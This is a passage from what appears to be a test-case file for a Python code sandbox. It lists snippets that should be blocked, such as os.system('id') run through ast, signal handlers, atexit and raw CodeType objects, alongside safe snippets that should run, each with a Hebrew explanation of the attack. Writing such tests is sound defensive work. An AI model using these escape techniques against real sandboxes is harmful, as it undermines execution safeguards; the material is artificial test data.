  // ════════════════════════════════════════════════════════════════
  {
    name: 'Python: ast module',
    code: `import ast; tree = ast.parse('import os; os.system("id")')`,
    expectBlocked: true,
    category: 'code_manipulation',
    explanation: `
      🎯 מתקפה: מניפולציה ב-AST

      איך האקרים משתמשים בזה:
      מודול ast מנתח קוד Python לעצי תחביר מופשטים.
      ניתן להשתמש בו כדי ליצור או לשנות קוד באופן דינמי.

      השפעה בעולם אמיתי:
      - יצירת קוד זדוני בצורה תכנותית
      - שינוי קוד לגיטימי בזמן ריצה
      - יצירת payloads מעורפלים
    `,
  },
  {
    name: 'Python: dis module',
    code: `import dis; dis.dis(lambda: __import__('os'))`,
    expectBlocked: true,
    category: 'code_manipulation',
    explanation: `
      🎯 מתקפה: פירוק Bytecode

      איך האקרים משתמשים בזה:
      מודול dis מציג bytecode של Python. הוא שימושי להבנת
      מנגנוני אבטחה כדי לעקוף אותם.

      השפעה בעולם אמיתי:
      - הנדסה לאחור של קוד אבטחה
      - הבנת bytecode לצורך מניפולציה
      - לימודי ליצירת exploits
    `,
  },
  {
    name: 'Python: types.CodeType',
    code: `import types; code = types.CodeType(0,0,0,0,0,0,b'',(),(),(),'','',0,b'')`,
    expectBlocked: true,
    category: 'code_manipulation',
    explanation: `
      🎯 מתקפה: יצירת אובייקטי קוד

      איך האקרים משתמשים בזה:
      CodeType יוצר אובייקטי קוד גולמיים מרכיבים פנימיים.
      ניתן לבנות איתו bytecode זדוני ישירות.

      השפעה בעולם אמיתי:
      - יצירת אובייקטי קוד ניתנים להרצה
      - עקיפת ניתוח קוד מקור
      - הזרקת bytecode ישירות
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SIGNAL/INTERRUPT ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Python: signal handling',
    code: `import signal; signal.signal(signal.SIGTERM, lambda s,f: __import__('os').system('id'))`,
    expectBlocked: true,
    category: 'signal_handling',
    explanation: `
      🎯 מתקפה: הרצת קוד דרך Signal Handler

      איך האקרים משתמשים בזה:
      Signal handlers רצים כאשר מתקבלים signals.
      handlers זדוניים יכולים לפעול בעקבות אירועי תהליך.

      השפעה בעולם אמיתי:
      - הרצת קוד בעת סיום תהליך
      - התמדה דרך טיפול ב-signals
      - הפעלה בעקבות אירועים חיצוניים
    `,
  },
  {
    name: 'Python: atexit',
    code: `import atexit; atexit.register(lambda: __import__('os').system('id'))`,
    expectBlocked: true,
    category: 'signal_handling',
    explanation: `
      🎯 מתקפה: רישום Exit Handler

      איך האקרים משתמשים בזה:
      atexit רושם פונקציות שירוצו ביציאה מהתוכנית.
      exit handlers זדוניים נשארים עד הכיבוי.

      השפעה בעולם אמיתי:
      - הרצת קוד בסיום התוכנית
      - הרצה מובטחת גם בעת שגיאות
      - התמדה שמסתווה כ-cleanup
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SAFE CODE
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Python: Safe print',
    code: `print('Hello, World!')`,
    expectBlocked: false,
    expectedOutput: 'Hello, World!',
    category: 'safe_code',
    explanation: `
      ✅ בטוח: פלט בסיסי

      זהו קוד לגיטימי שצריך לרוץ:
      print() היא פעולה בסיסית ללימוד Python
      ולדיבוג קוד. בטוחה לחלוטין.
    `,
  },
  {
    name: 'Python: Safe math',
    code: `print(2 + 2)`,
    expectBlocked: false,
    expectedOutput: '4',
    category: 'safe_code',
    explanation: `
      ✅ בטוח: פעולות מתמטיות

      זהו קוד לגיטימי שצריך לרוץ:
      חשבון בסיסי הוא חלק חיוני מכל תכנות.
    `,
  },
  {
    name: 'Python: Safe list comprehension',
    code: `print([x**2 for x in range(5)])`,
    expectBlocked: false,
    expectedOutput: '[0, 1, 4, 9, 16]',
    category: 'safe_code',
    explanation: `
      ✅ בטוח: List Comprehension

      זהו קוד לגיטימי שצריך לרוץ:
      List comprehensions הם סגנון Pythonic ונפוץ
      בלימוד קורסים בסיסיים.
    `,
  },
  {
    name: 'Python: Safe class definition',
    code: `class Point:
    def __init__(self, x, y):
        self.x = x
        self.y = y
p = Point(3, 4)
print(p.x + p.y)`,
    expectBlocked: false,
    expectedOutput: '7',
    category: 'safe_code',
    explanation: `
      ✅ בטוח: תכנות מונחה-עצמים

      זהו קוד לגיטימי שצריך לרוץ:
      הגדרת מחלקות ויצירת אובייקטים הן
      פעולות בסיסיות בפיתוח Python.
    `,
  },
  {
    name: 'Python: Safe lambda',
    code: `double = lambda x: x * 2; print(double(5))`,
    expectBlocked: false,
    expectedOutput: '10',
    category: 'safe_code',
    explanation: `
      ✅ בטוח: פונקציות Lambda

      זהו קוד לגיטימי שצריך לרוץ:
      ביטויי Lambda שימושיים לפונקציות אנונימיות
      פשוטות.
    `,
  },
];
